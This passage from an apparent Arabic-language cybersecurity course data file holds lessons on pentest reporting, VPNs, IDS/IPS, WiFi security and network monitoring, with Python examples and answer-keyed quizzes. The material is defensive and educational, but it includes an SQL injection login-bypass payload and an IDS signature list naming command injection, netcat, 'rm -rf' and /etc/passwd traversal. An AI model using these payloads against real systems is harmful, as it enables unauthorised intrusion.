        'Rainbow Tables لا تدعم Salt',
      ],
      correctAnswer: 1,
      explanation:
        'Salt يضاف لكلمة المرور قبل الـ hash، مما يجعل كل hash فريد حتى لو كانت كلمة المرور نفسها. هذا يُبطل جداول Rainbow المحسوبة مسبقاً',
    },
  },
  {
    id: 'ethical-reporting',
    courseId: 'cyber-ethical-hacking',
    title: 'كتابة التقارير الأمنية',
    description: 'كيف توثّق وتقدّم نتائجك بشكل احترافي',
    content: `
# كتابة التقارير الأمنية

## أهمية التقرير
- يُوثّق عملك
- يُقنع العميل بالمشاكل
- يُساعد المطورين على الإصلاح
- دليل قانوني على عملك المصرّح

## أجزاء التقرير

### 1. الملخص التنفيذي (Executive Summary)
- لغير التقنيين
- النتائج الرئيسية
- التوصيات العامة
- 1-2 صفحة

### 2. نطاق الاختبار (Scope)
- ما تم اختباره
- ما لم يُختبر
- الفترة الزمنية
- القيود

### 3. المنهجية (Methodology)
- الأدوات المستخدمة
- الخطوات المتبعة
- معايير التقييم

### 4. النتائج (Findings)
لكل ثغرة:
- **العنوان**: وصف قصير
- **الخطورة**: Critical/High/Medium/Low
- **الوصف**: شرح المشكلة
- **التأثير**: ماذا يمكن أن يحدث
- **الدليل**: Screenshots, PoC
- **التوصية**: كيفية الإصلاح

### 5. الملاحق (Appendices)
- Logs كاملة
- أكواد الاستغلال
- تفاصيل تقنية

## تصنيف الخطورة (CVSS)

| الخطورة | النطاق | الوصف |
|---------|--------|-------|
| Critical | 9.0-10.0 | استغلال فوري، تأثير كارثي |
| High | 7.0-8.9 | استغلال سهل، تأثير كبير |
| Medium | 4.0-6.9 | استغلال يحتاج شروط |
| Low | 0.1-3.9 | تأثير محدود |
| Info | 0 | معلومات فقط |

## نصائح للكتابة
- كن واضحاً ومحدداً
- أضف صور وأدلة
- اقترح حلولاً عملية
- راجع قبل التسليم
`,
    codeExample: `# قالب تقرير اختبار اختراق
from datetime import datetime
import json

class PenTestReport:
    """
    قالب تقرير اختبار اختراق احترافي
    """
    
    def __init__(self, client_name, target, tester_name):
        self.report = {
            "metadata": {
                "title": f"تقرير اختبار اختراق - {client_name}",
                "client": client_name,
                "target": target,
                "tester": tester_name,
                "date": datetime.now().strftime("%Y-%m-%d"),
                "version": "1.0"
            },
            "executive_summary": "",
            "scope": {
                "in_scope": [],
                "out_of_scope": [],
                "testing_period": "",
                "limitations": []
            },
            "methodology": [],
            "findings": [],
            "recommendations": [],
            "appendices": []
        }
    
    def set_scope(self, in_scope, out_of_scope, period, limitations=None):
        """تحديد نطاق الاختبار"""
        self.report["scope"] = {
            "in_scope": in_scope,
            "out_of_scope": out_of_scope,
            "testing_period": period,
            "limitations": limitations or []
        }
    
    def add_methodology(self, phase, description, tools):
        """إضافة خطوة منهجية"""
        self.report["methodology"].append({
            "phase": phase,
            "description": description,
            "tools": tools
        })
    
    def add_finding(self, title, severity, description, impact, 
                    evidence, recommendation, cvss_score=None):
        """إضافة ثغرة مكتشفة"""
        
        finding_id = f"VULN-{len(self.report['findings']) + 1:03d}"
        
        finding = {
            "id": finding_id,
            "title": title,
            "severity": severity,
            "cvss_score": cvss_score,
            "description": description,
            "impact": impact,
            "evidence": evidence,
            "recommendation": recommendation,
            "status": "Open"
        }
        
        self.report["findings"].append(finding)
        return finding_id
    
    def generate_executive_summary(self):
        """توليد الملخص التنفيذي"""
        
        # إحصائيات
        severity_count = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
        for f in self.report["findings"]:
            severity_count[f["severity"]] += 1
        
        total = len(self.report["findings"])
        critical_high = severity_count["Critical"] + severity_count["High"]
        
        summary = f"""
الملخص التنفيذي
===============

تم إجراء اختبار اختراق لـ {self.report['metadata']['client']} 
في الفترة {self.report['scope']['testing_period']}.

النتائج الرئيسية:
-----------------
• إجمالي الثغرات المكتشفة: {total}
  - حرجة (Critical): {severity_count['Critical']}
  - عالية (High): {severity_count['High']}
  - متوسطة (Medium): {severity_count['Medium']}
  - منخفضة (Low): {severity_count['Low']}
  - معلوماتية (Info): {severity_count['Info']}

التقييم العام:
-------------
"""
        
        if critical_high > 0:
            summary += f"⚠️ الوضع الأمني يحتاج اهتمام فوري! ({critical_high} ثغرات حرجة/عالية)"
        elif severity_count["Medium"] > 0:
            summary += "⚠️ الوضع الأمني مقبول مع وجود مجال للتحسين"
        else:
            summary += "✅ الوضع الأمني جيد"
        
        summary += """

التوصيات العاجلة:
----------------
"""
        # أضف الثغرات الحرجة والعالية
        for f in self.report["findings"]:
            if f["severity"] in ["Critical", "High"]:
                summary += f"• [{f['severity']}] {f['title']}\\n"
        
        self.report["executive_summary"] = summary
        return summary
    
    def generate_markdown(self):
        """توليد التقرير بصيغة Markdown"""
        
        md = f"""# {self.report['metadata']['title']}

**العميل:** {self.report['metadata']['client']}  
**الهدف:** {self.report['metadata']['target']}  
**المختبر:** {self.report['metadata']['tester']}  
**التاريخ:** {self.report['metadata']['date']}  
**الإصدار:** {self.report['metadata']['version']}

---

{self.report['executive_summary']}

---

## نطاق الاختبار

### ضمن النطاق:
"""
        for item in self.report['scope']['in_scope']:
            md += f"- {item}\\n"
        
        md += """
### خارج النطاق:
"""
        for item in self.report['scope']['out_of_scope']:
            md += f"- {item}\\n"
        
        md += f"""
**فترة الاختبار:** {self.report['scope']['testing_period']}

---

## المنهجية

"""
        for i, method in enumerate(self.report['methodology'], 1):
            md += f"""### {i}. {method['phase']}
{method['description']}

**الأدوات:** {', '.join(method['tools'])}

"""
        
        md += """---

## النتائج التفصيلية

"""
        for finding in self.report['findings']:
            severity_emoji = {
                "Critical": "🔴",
                "High": "🟠", 
                "Medium": "🟡",
                "Low": "🟢",
                "Info": "🔵"
            }
            
            md += f"""### {finding['id']}: {finding['title']}

{severity_emoji.get(finding['severity'], '')} **الخطورة:** {finding['severity']}
{f"**CVSS:** {finding['cvss_score']}" if finding['cvss_score'] else ""}

**الوصف:**  
{finding['description']}

**التأثير:**  
{finding['impact']}

**الدليل:**  
{finding['evidence']}

**التوصية:**  
{finding['recommendation']}

---

"""
        
        return md
    
    def save_report(self, filename):
        """حفظ التقرير"""
        # JSON
        with open(f"{filename}.json", 'w', encoding='utf-8') as f:
            json.dump(self.report, f, ensure_ascii=False, indent=2)
        
        # Markdown
        self.generate_executive_summary()
        md = self.generate_markdown()
        with open(f"{filename}.md", 'w', encoding='utf-8') as f:
            f.write(md)
        
        print(f"✅ تم حفظ التقرير: {filename}.json و {filename}.md")


# ===== مثال على إنشاء تقرير =====
report = PenTestReport(
    client_name="شركة Example",
    target="example.com",
    tester_name="أحمد - فريق الأمن"
)

# تحديد النطاق
report.set_scope(
    in_scope=["example.com", "api.example.com", "admin.example.com"],
    out_of_scope=["mail.example.com", "Third-party services"],
    period="1-15 يناير 2024",
    limitations=["لا اختبار DDoS", "ساعات العمل فقط"]
)

# المنهجية
report.add_methodology(
    "الاستطلاع",
    "جمع المعلومات عن الهدف",
    ["Nmap", "theHarvester", "Google Dorks"]
)
report.add_methodology(
    "الفحص",
    "فحص الثغرات والخدمات",
    ["Nmap", "Nikto", "Burp Suite"]
)
report.add_methodology(
    "الاستغلال",
    "محاولة استغلال الثغرات المكتشفة",
    ["Burp Suite", "SQLmap", "Manual Testing"]
)

# إضافة ثغرات
report.add_finding(
    title="SQL Injection في صفحة تسجيل الدخول",
    severity="Critical",
    description="حقل username يقبل أوامر SQL ضارة",
    impact="يمكن للمهاجم الوصول لقاعدة البيانات كاملة وسرقة بيانات المستخدمين",
    evidence="Payload: ' OR '1'='1' -- \\nالنتيجة: تم تسجيل الدخول بدون كلمة مرور",
    recommendation="استخدام Prepared Statements وتنظيف المدخلات",
    cvss_score=9.8
)

report.add_finding(
    title="Missing Content-Security-Policy Header",
    severity="Medium",
    description="الموقع لا يرسل CSP header",
    impact="يزيد من خطر هجمات XSS",
    evidence="curl -I https://example.com | grep -i content-security",
    recommendation="إضافة CSP header مناسب",
    cvss_score=5.3
)

# توليد وحفظ
report.generate_executive_summary()
print(report.generate_markdown())
# report.save_report("pentest_report_example")`,
    language: 'python',
    xpReward: 150,
    order: 7,
    quiz: {
      question: 'ما أهم جزء في التقرير للإدارة العليا؟',
      options: [
        'التفاصيل التقنية',
        'أكواد الاستغلال',
        'الملخص التنفيذي',
        'الملاحق',
      ],
      correctAnswer: 2,
      explanation:
        'الملخص التنفيذي يُكتب بلغة غير تقنية للإدارة لفهم المخاطر واتخاذ القرارات',
    },
  },
];

// تصدير دروس الاختراق الأخلاقي
export const ALL_ETHICAL_HACKING_LESSONS = ETHICAL_HACKING_LESSONS;

// ===== دروس أمن الشبكات الإضافية =====
export const NETWORK_SECURITY_LESSONS: Lesson[] = [
  {
    id: 'cyber-vpn-security',
    courseId: 'cyber-network',
    title: 'VPN - الشبكات الافتراضية الخاصة',
    description: 'كيف تحمي VPN اتصالاتك',
    content: `
# VPN - Virtual Private Network

## ما هو VPN؟
نفق مشفر لنقل البيانات عبر شبكة غير آمنة.

## كيف يعمل؟
1. جهازك ← **تشفير** ← نفق VPN ← خادم VPN ← الإنترنت
2. عنوان IP يظهر كـ IP الخادم

## بروتوكولات VPN

### OpenVPN
- مفتوح المصدر ✅
- آمن جداً ✅
- مرن ✅
- أبطأ قليلاً

### WireGuard
- حديث وسريع ✅
- كود أقل = أخطاء أقل ✅
- سهل الإعداد ✅

### IPSec/IKEv2
- مدمج في معظم الأنظمة
- سريع
- جيد للموبايل

### PPTP ⚠️
- قديم وغير آمن!
- لا تستخدمه

## أنواع VPN

### Remote Access VPN
- للموظفين عن بُعد
- الاتصال بشبكة الشركة

### Site-to-Site VPN
- ربط مكاتب مختلفة
- شبكة موحدة

### SSL/TLS VPN
- عبر المتصفح
- سهل الاستخدام

## استخدامات VPN
- 🔒 حماية WiFi العام
- 🌍 تجاوز الحجب الجغرافي
- 🏢 العمل عن بُعد بأمان
- 🕵️ الخصوصية (جزئياً)

## ⚠️ حدود VPN
- لا يخفيك تماماً
- مزود VPN يرى حركتك
- لا يحمي من Malware
- قد يُبطئ الاتصال
`,
    codeExample: `# محاكاة مفاهيم VPN
import socket
import ssl
import hashlib

class VPNConceptDemo:
    """
    عرض توضيحي لمفاهيم VPN
    """
    
    @staticmethod
    def demonstrate_encryption():
        """
        توضيح كيف يشفر VPN البيانات
        """
        print("\\n🔐 محاكاة تشفير VPN")
        print("=" * 50)
        
        # البيانات الأصلية
        original_data = "GET /secret-page HTTP/1.1\\nHost: example.com"
        print(f"\\n📤 البيانات الأصلية (بدون VPN):")
        print(f"   {original_data[:50]}...")
        print("   ⚠️ يمكن لأي شخص على الشبكة قراءتها!")
        
        # محاكاة التشفير
        encrypted = hashlib.sha256(original_data.encode()).hexdigest()
        print(f"\\n🔒 البيانات المشفرة (مع VPN):")
        print(f"   {encrypted}")
        print("   ✅ غير مقروءة بدون مفتاح فك التشفير!")
    
    @staticmethod
    def demonstrate_ip_masking():
        """
        توضيح إخفاء IP
        """
        print("\\n🌐 محاكاة إخفاء IP")
        print("=" * 50)
        
        real_ip = "192.168.1.100"  # IP حقيقي
        vpn_server_ip = "185.199.110.153"  # IP خادم VPN
        
        print(f"\\n❌ بدون VPN:")
        print(f"   IP الظاهر للمواقع: {real_ip}")
        print(f"   الموقع: الرياض، السعودية")
        
        print(f"\\n✅ مع VPN:")
        print(f"   IP الظاهر للمواقع: {vpn_server_ip}")
        print(f"   الموقع: أمستردام، هولندا")
    
    @staticmethod
    def vpn_protocols_comparison():
        """
        مقارنة بروتوكولات VPN
        """
        print("\\n📊 مقارنة بروتوكولات VPN")
        print("=" * 50)
        
        protocols = [
            {
                "name": "WireGuard",
                "security": "⭐⭐⭐⭐⭐",
                "speed": "⭐⭐⭐⭐⭐",
                "stability": "⭐⭐⭐⭐",
                "recommendation": "✅ الأفضل للاستخدام العام"
            },
            {
                "name": "OpenVPN",
                "security": "⭐⭐⭐⭐⭐",
                "speed": "⭐⭐⭐",
                "stability": "⭐⭐⭐⭐⭐",
                "recommendation": "✅ الأفضل للشركات"
            },
            {
                "name": "IKEv2/IPSec",
                "security": "⭐⭐⭐⭐",
                "speed": "⭐⭐⭐⭐",
                "stability": "⭐⭐⭐⭐⭐",
                "recommendation": "✅ الأفضل للموبايل"
            },
            {
                "name": "PPTP",
                "security": "⭐",
                "speed": "⭐⭐⭐⭐⭐",
                "stability": "⭐⭐⭐",
                "recommendation": "❌ لا تستخدمه - غير آمن!"
            }
        ]
        
        for p in protocols:
            print(f"\\n{p['name']}:")
            print(f"  الأمان: {p['security']}")
            print(f"  السرعة: {p['speed']}")
            print(f"  الاستقرار: {p['stability']}")
            print(f"  التوصية: {p['recommendation']}")
    
    @staticmethod
    def check_vpn_connection():
        """
        فحص اتصال VPN (محاكاة)
        """
        print("\\n🔍 فحص اتصال VPN")
        print("=" * 50)
        
        checks = [
            ("DNS Leak", "✅ لا تسريب"),
            ("WebRTC Leak", "✅ لا تسريب"),
            ("IPv6 Leak", "⚠️ تحقق من إعدادات IPv6"),
            ("Kill Switch", "✅ مفعّل"),
        ]
        
        for check, status in checks:
            print(f"  {check}: {status}")

# تشغيل العرض
demo = VPNConceptDemo()
demo.demonstrate_encryption()
demo.demonstrate_ip_masking()
demo.vpn_protocols_comparison()
demo.check_vpn_connection()`,
    language: 'python',
    xpReward: 120,
    order: 3,
    quiz: {
      question: 'أي بروتوكول VPN يُعتبر غير آمن؟',
      options: ['OpenVPN', 'WireGuard', 'PPTP', 'IKEv2'],
      correctAnswer: 2,
      explanation: 'PPTP قديم ويحتوي ثغرات أمنية معروفة، لا يُنصح باستخدامه',
    },
  },
  {
    id: 'cyber-ids-ips',
    courseId: 'cyber-network',
    title: 'IDS/IPS - أنظمة كشف ومنع التسلل',
    description: 'كيف تكتشف وتمنع الهجمات',
    content: `
# IDS/IPS - كشف ومنع التسلل

## IDS - Intrusion Detection System
نظام **يكتشف** الهجمات ويُنبّه.

## IPS - Intrusion Prevention System
نظام **يكتشف ويمنع** الهجمات تلقائياً.

## أنواع IDS/IPS

### Network-based (NIDS/NIPS)
- يراقب حركة الشبكة
- يُوضع على نقاط استراتيجية
- أمثلة: Snort, Suricata

### Host-based (HIDS/HIPS)
- يراقب جهاز واحد
- يفحص الملفات والـ logs
- أمثلة: OSSEC, Wazuh

## طرق الكشف

### Signature-based
- يبحث عن أنماط هجمات معروفة
- سريع ودقيق ✅
- لا يكتشف الجديد ❌

### Anomaly-based
- يتعلم السلوك الطبيعي
- يكتشف الانحرافات
- يكتشف الجديد ✅
- False positives أكثر ❌

### Behavior-based
- يحلل سلوك البرامج
- يكتشف الأنماط المشبوهة

## أمثلة على القواعد (Snort)

\`\`\`
# كشف محاولة SQL Injection
alert tcp any any -> any 80 (content:"' OR '1'='1"; msg:"SQL Injection Attempt";)

# كشف فحص المنافذ
alert tcp any any -> any any (flags:S; threshold:type both, track by_src, count 20, seconds 10; msg:"Port Scan Detected";)
\`\`\`

## Placement
أين نضع IDS/IPS؟
- بعد الـ Firewall
- قبل الخوادم المهمة
- على نقاط الدخول
`,
    codeExample: `# محاكاة IDS بسيط
import re
from datetime import datetime
from collections import defaultdict

class SimpleIDS:
    """
    نظام كشف تسلل بسيط للتعليم
    """
    
    def __init__(self):
        self.alerts = []
        self.connection_count = defaultdict(int)
        self.failed_logins = defaultdict(int)
        
        # قواعد Signature-based
        self.signatures = {
            "sql_injection": [
                r"'\\s*OR\\s*'1'\\s*=\\s*'1",
                r"UNION\\s+SELECT",
                r"DROP\\s+TABLE",
                r"--\\s*$",
            ],
            "xss": [
                r"<script[^>]*>",
                r"javascript:",
                r"onerror\\s*=",
                r"onload\\s*=",
            ],
            "command_injection": [
                r";\\s*cat\\s+/etc/passwd",
                r"\\|\\s*nc\\s+",
                r";\\s*rm\\s+-rf",
                r"\$\\(.*\\)",
            ],
            "path_traversal": [
                r"\\.\\./\\.\\./",
                r"etc/passwd",
                r"windows/system32",
            ],
        }
        
        # عتبات Anomaly detection
        self.thresholds = {
            "connections_per_minute": 100,
            "failed_logins": 5,
            "request_size": 10000,
        }
    
    def log_alert(self, severity, alert_type, description, source_ip, details=None):
        """تسجيل تنبيه"""
        alert = {
            "timestamp": datetime.now().isoformat(),
            "severity": severity,
            "type": alert_type,
            "description": description,
            "source_ip": source_ip,
            "details": details or {}
        }
        self.alerts.append(alert)
        
        emoji = {"HIGH": "🔴", "MEDIUM": "🟡", "LOW": "🟢"}
        print(f"[{emoji.get(severity, '⚪')} {severity}] {alert_type}: {description}")
        print(f"    Source: {source_ip}")
    
    def check_signatures(self, request_data, source_ip):
        """فحص Signature-based"""
        for attack_type, patterns in self.signatures.items():
            for pattern in patterns:
                if re.search(pattern, request_data, re.IGNORECASE):
                    self.log_alert(
                        severity="HIGH",
                        alert_type=attack_type.upper(),
                        description=f"تم اكتشاف {attack_type}",
                        source_ip=source_ip,
                        details={"pattern": pattern, "data": request_data[:100]}
                    )
                    return True
        return False
    
    def check_anomalies(self, source_ip, request_size=0, is_failed_login=False):
        """فحص Anomaly-based"""
        alerts = []
        
        # فحص عدد الاتصالات
        self.connection_count[source_ip] += 1
        if self.connection_count[source_ip] > self.thresholds["connections_per_minute"]:
            self.log_alert(
                severity="MEDIUM",
                alert_type="RATE_LIMIT",
                description=f"عدد اتصالات غير طبيعي: {self.connection_count[source_ip]}",
                source_ip=source_ip
            )
            alerts.append("rate_limit")
        
        # فحص محاولات تسجيل الدخول الفاشلة
        if is_failed_login:
            self.failed_logins[source_ip] += 1
            if self.failed_logins[source_ip] >= self.thresholds["failed_logins"]:
                self.log_alert(
                    severity="HIGH",
                    alert_type="BRUTE_FORCE",
                    description=f"محاولات تسجيل دخول فاشلة: {self.failed_logins[source_ip]}",
                    source_ip=source_ip
                )
                alerts.append("brute_force")
        
        # فحص حجم الطلب
        if request_size > self.thresholds["request_size"]:
            self.log_alert(
                severity="MEDIUM",
                alert_type="LARGE_REQUEST",
                description=f"طلب كبير جداً: {request_size} bytes",
                source_ip=source_ip
            )
            alerts.append("large_request")
        
        return alerts
    
    def analyze_request(self, request, source_ip):
        """تحليل طلب HTTP"""
        print(f"\\n📥 تحليل طلب من {source_ip}...")
        
        # فحص Signatures
        if self.check_signatures(request, source_ip):
            return {"blocked": True, "reason": "signature_match"}
        
        # فحص Anomalies
        anomalies = self.check_anomalies(source_ip, len(request))
        if anomalies:
            return {"blocked": False, "warnings": anomalies}
        
        print("   ✅ الطلب يبدو آمناً")
        return {"blocked": False}
    
    def get_summary(self):
        """ملخص التنبيهات"""
        print("\\n" + "=" * 50)
        print("📊 ملخص التنبيهات")
        print("=" * 50)
        
        severity_count = {"HIGH": 0, "MEDIUM": 0, "LOW": 0}
        for alert in self.alerts:
            severity_count[alert["severity"]] += 1
        
        print(f"  🔴 عالية: {severity_count['HIGH']}")
        print(f"  🟡 متوسطة: {severity_count['MEDIUM']}")
        print(f"  🟢 منخفضة: {severity_count['LOW']}")
        print(f"  📋 الإجمالي: {len(self.alerts)}")


# ===== اختبار =====
ids = SimpleIDS()

# طلبات للاختبار
test_requests = [
    ("192.168.1.100", "GET /index.html HTTP/1.1"),
    ("10.0.0.50", "GET /search?q=' OR '1'='1 HTTP/1.1"),
    ("172.16.0.25", "POST /login HTTP/1.1\\n<script>alert('xss')</script>"),
    ("192.168.1.100", "GET /files?path=../../../../etc/passwd HTTP/1.1"),
    ("10.0.0.50", "GET /api/data HTTP/1.1"),
]

for ip, request in test_requests:
    ids.analyze_request(request, ip)

# محاكاة Brute Force
print("\\n📥 محاكاة Brute Force Attack...")
for i in range(6):
    ids.check_anomalies("attacker_ip", is_failed_login=True)

ids.get_summary()`,
    language: 'python',
    xpReward: 150,
    order: 4,
    quiz: {
      question: 'ما الفرق بين IDS و IPS؟',
      options: [
        'IDS أسرع',
        'IDS يكتشف فقط، IPS يكتشف ويمنع',
        'IPS للشبكات فقط',
        'لا فرق بينهما',
      ],
      correctAnswer: 1,
      explanation:
        'IDS (Detection) يكتشف وينبّه فقط، IPS (Prevention) يكتشف ويمنع الهجوم تلقائياً',
    },
  },
  {
    id: 'cyber-wifi-security',
    courseId: 'cyber-network',
    title: 'أمن الشبكات اللاسلكية',
    description: 'حماية WiFi من الاختراق',
    content: `
# أمن WiFi

## بروتوكولات التشفير

### WEP ❌
- Wired Equivalent Privacy
- **مكسور تماماً!** يُخترق في دقائق
- لا تستخدمه أبداً

### WPA ⚠️
- WiFi Protected Access
- أفضل من WEP لكن له ثغرات
- تجنبه إن أمكن

### WPA2 ✅
- الأكثر شيوعاً حالياً
- AES encryption
- آمن مع كلمة مرور قوية

### WPA3 ✅✅
- الأحدث والأكثر أماناً
- حماية من Brute Force
- تشفير فردي لكل جهاز

## هجمات WiFi الشائعة

### 1. Evil Twin
- نقطة وصول مزيفة بنفس الاسم
- الضحية يتصل بها ظناً أنها حقيقية

### 2. Deauthentication Attack
- إجبار الأجهزة على قطع الاتصال
- ثم التقاط Handshake

### 3. WPS Attack
- PIN مكون من 8 أرقام فقط
- يُكسر في ساعات

### 4. Dictionary Attack
- تجربة كلمات مرور شائعة
- على Handshake المُلتقط

## حماية شبكتك

### الإعدادات الأساسية ✅
- استخدم WPA3 أو WPA2
- كلمة مرور قوية (12+ حرف)
- عطّل WPS
- غيّر اسم الشبكة الافتراضي
- غيّر كلمة مرور الراوتر

### الإعدادات المتقدمة
- MAC Filtering (محدود الفائدة)
- إخفاء SSID (محدود الفائدة)
- شبكة ضيوف منفصلة
- تحديث Firmware
`,
    codeExample: `# أدوات فحص WiFi (للتعليم)
import subprocess
import re

class WiFiSecurityChecker:
    """
    فحص أمان WiFi للتعليم
    ⚠️ للاستخدام على شبكاتك فقط!
    """
    
    @staticmethod
    def explain_wifi_security():
        """شرح مستويات أمان WiFi"""
        print("\\n🔐 مستويات أمان WiFi")
        print("=" * 50)
        
        protocols = [
            {
                "name": "Open (بدون كلمة مرور)",
                "security": "❌❌❌❌❌",
                "note": "أي شخص يمكنه الاتصال والتجسس!"
            },
            {
                "name": "WEP",
                "security": "❌❌❌❌",
                "note": "يُكسر في دقائق! لا تستخدمه"
            },
            {
                "name": "WPA",
                "security": "⚠️⚠️",
                "note": "ثغرات معروفة، تجنبه"
            },
            {
                "name": "WPA2-PSK (Personal)",
                "security": "✅✅✅",
                "note": "جيد مع كلمة مرور قوية"
            },
            {
                "name": "WPA2-Enterprise",
                "security": "✅✅✅✅",
                "note": "للشركات، يحتاج RADIUS server"
            },
            {
                "name": "WPA3",
                "security": "✅✅✅✅✅",
                "note": "الأفضل! استخدمه إن توفر"
            }
        ]
        
        for p in protocols:
            print(f"\\n{p['name']}")
            print(f"  الأمان: {p['security']}")
            print(f"  ملاحظة: {p['note']}")
    
    @staticmethod
    def password_strength_wifi(password):
        """تقييم قوة كلمة مرور WiFi"""
        print(f"\\n🔑 تقييم كلمة مرور WiFi")
        print("=" * 50)
        
        score = 0
        issues = []
        
        # الطول
        if len(password) >= 20:
            score += 30
        elif len(password) >= 12:
            score += 20
        elif len(password) >= 8:
            score += 10
        else:
            issues.append("❌ قصيرة جداً (< 8)")
        
        # التنوع
        if re.search(r'[a-z]', password):
            score += 10
        else:
            issues.append("❌ أضف أحرف صغيرة")
            
        if re.search(r'[A-Z]', password):
            score += 10
        else:
            issues.append("❌ أضف أحرف كبيرة")
            
        if re.search(r'[0-9]', password):
            score += 10
        else:
            issues.append("❌ أضف أرقام")
            
        if re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
            score += 15
        else:
            issues.append("⚠️ أضف رموز")
        
        # كلمات شائعة
        common = ['password', 'wifi', '12345678', 'qwerty', 'internet']
        if password.lower() in common:
            score = 0
            issues.append("🔴 كلمة مرور شائعة جداً!")
        
        # التقييم
        if score >= 60:
            strength = "🟢 قوية"
        elif score >= 40:
            strength = "🟡 متوسطة"
        else:
            strength = "🔴 ضعيفة"
        
        print(f"  كلمة المرور: {'*' * len(password)}")
        print(f"  القوة: {strength} ({score}/75)")
        
        if issues:
            print("  المشاكل:")
            for issue in issues:
                print(f"    {issue}")
        
        return score
    
    @staticmethod
    def security_checklist():
        """قائمة فحص أمان WiFi"""
        print("\\n📋 قائمة فحص أمان WiFi")
        print("=" * 50)
        
        checklist = [
            ("استخدام WPA3 أو WPA2", "تحقق من إعدادات الراوتر"),
            ("كلمة مرور قوية (12+ حرف)", "غيّرها إن كانت ضعيفة"),
            ("تعطيل WPS", "WPS → Disable"),
            ("تغيير كلمة مرور الراوتر", "لا تترك admin/admin!"),
            ("تحديث Firmware", "تحقق من تحديثات الراوتر"),
            ("تغيير SSID الافتراضي", "لا يكشف نوع الراوتر"),
            ("شبكة ضيوف منفصلة", "للزوار بدون وصول للشبكة الرئيسية"),
            ("تعطيل Remote Management", "إلا إذا كنت تحتاجه"),
        ]
        
        print("\\n  [ ] قائمة المهام:")
        for task, note in checklist:
            print(f"  [ ] {task}")
            print(f"      💡 {note}")
    
    @staticmethod
    def detect_evil_twin_signs():
        """علامات Evil Twin Attack"""
        print("\\n🚨 علامات هجوم Evil Twin")
        print("=" * 50)
        
        signs = [
            "شبكتان بنفس الاسم (SSID)",
            "طلب إعادة إدخال كلمة المرور فجأة",
            "انقطاع متكرر للاتصال",
            "صفحة تسجيل دخول غير مألوفة",
            "تحذيرات الشهادة في المتصفح",
            "سرعة إنترنت أبطأ من المعتاد",
        ]
        
        print("\\n  انتبه لهذه العلامات:")
        for sign in signs:
            print(f"  ⚠️ {sign}")
        
        print("\\n  🛡️ الحماية:")
        print("  - استخدم VPN على WiFi العام")
        print("  - تحقق من BSSID (MAC) للشبكة")
        print("  - تجنب إدخال بيانات حساسة")


# تشغيل
checker = WiFiSecurityChecker()
checker.explain_wifi_security()
checker.password_strength_wifi("MyW1F1P@ss!")
checker.security_checklist()
checker.detect_evil_twin_signs()`,
    language: 'python',
    xpReward: 140,
    order: 5,
    quiz: {
      question: 'أي بروتوكول WiFi يمكن كسره في دقائق؟',
      options: ['WPA3', 'WPA2', 'WPA', 'WEP'],
      correctAnswer: 3,
      explanation:
        'WEP يستخدم خوارزمية ضعيفة ويمكن كسره في دقائق باستخدام أدوات مثل aircrack-ng',
    },
  },
  {
    id: 'cyber-network-monitoring',
    courseId: 'cyber-network',
    title: 'مراقبة الشبكات',
    description: 'أدوات وتقنيات مراقبة الشبكة',
    content: `
# مراقبة الشبكات

## لماذا المراقبة؟
- اكتشاف الهجمات
- تحليل الأداء
- حل المشاكل
- الامتثال للوائح

## أدوات المراقبة

### Wireshark
- تحليل الحزم (Packet Analysis)
- التقاط كل حركة الشبكة
- فلاتر قوية

### tcpdump
- سطر الأوامر
- خفيف وسريع
\`\`\`bash
tcpdump -i eth0 port 80
\`\`\`

### Netflow/sFlow
- إحصائيات تدفق البيانات
- لا يلتقط المحتوى

### SNMP
- Simple Network Management Protocol
- مراقبة الأجهزة

### Nagios/Zabbix
- مراقبة البنية التحتية
- تنبيهات تلقائية

## ما نراقب؟

### حركة المرور
- البروتوكولات المستخدمة
- حجم البيانات
- مصادر ووجهات

### الأداء
- Latency (التأخير)
- Bandwidth usage
- Packet loss

### الأمان
- محاولات اتصال مشبوهة
- حركة غير عادية
- بروتوكولات غير متوقعة

## فلاتر Wireshark المفيدة

\`\`\`
# HTTP فقط
http

# IP محدد
ip.addr == 192.168.1.1

# TCP port
tcp.port == 443

# DNS queries
dns

# بدون ARP
!arp

# HTTP POST
http.request.method == "POST"

# كلمات مرور (خطير!)
http contains "password"
\`\`\`
`,
    codeExample: `# أدوات مراقبة الشبكة
import socket
import struct
import time
from collections import defaultdict

class NetworkMonitor:
    """
    مراقب شبكة بسيط للتعليم
    """
    
    def __init__(self):
        self.connections = defaultdict(int)
        self.protocols = defaultdict(int)
        self.bytes_transferred = 0
    
    def analyze_packet(self, raw_data):
        """
        تحليل حزمة IP
        """
        # استخراج معلومات أساسية من IP header
        version_ihl = raw_data[0]
        version = version_ihl >> 4
        ihl = (version_ihl & 0xF) * 4
        
        ttl = raw_data[8]
        protocol = raw_data[9]
        
        src_ip = ".".join(map(str, raw_data[12:16]))
        dst_ip = ".".join(map(str, raw_data[16:20]))
        
        # تحديد البروتوكول
        protocol_names = {
            1: "ICMP",
            6: "TCP",
            17: "UDP"
        }
        protocol_name = protocol_names.get(protocol, f"Unknown({protocol})")
        
        return {
            "version": version,
            "header_length": ihl,
            "ttl": ttl,
            "protocol": protocol_name,
            "src_ip": src_ip,
            "dst_ip": dst_ip
        }
    
    def parse_tcp_header(self, raw_data, ip_header_length):
        """
        استخراج معلومات TCP
        """
        tcp_header = raw_data[ip_header_length:ip_header_length+20]
        
        src_port = struct.unpack('!H', tcp_header[0:2])[0]
        dst_port = struct.unpack('!H', tcp_header[2:4])[0]
        
        return {
            "src_port": src_port,
            "dst_port": dst_port
        }
    
    def detect_suspicious_activity(self, packet_info):
        """
        اكتشاف نشاط مشبوه
        """
        alerts = []
        
        # فحص المنافذ المشبوهة
        suspicious_ports = [4444, 5555, 6666, 31337, 12345]
        
        if 'src_port' in packet_info:
            if packet_info['src_port'] in suspicious_ports:
                alerts.append(f"⚠️ منفذ مصدر مشبوه: {packet_info['src_port']}")
            if packet_info['dst_port'] in suspicious_ports:
                alerts.append(f"⚠️ منفذ وجهة مشبوه: {packet_info['dst_port']}")
        
        return alerts
    
    def get_common_ports(self, port):
        """
        تحديد الخدمة من المنفذ
        """
        services = {
            20: "FTP-data", 21: "FTP", 22: "SSH", 23: "Telnet",
            25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3",
            143: "IMAP", 443: "HTTPS", 993: "IMAPS", 995: "POP3S",
            3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
            6379: "Redis", 27017: "MongoDB"
        }
        return services.get(port, f"Unknown({port})")
    
    def generate_traffic_report(self, duration_seconds=10):
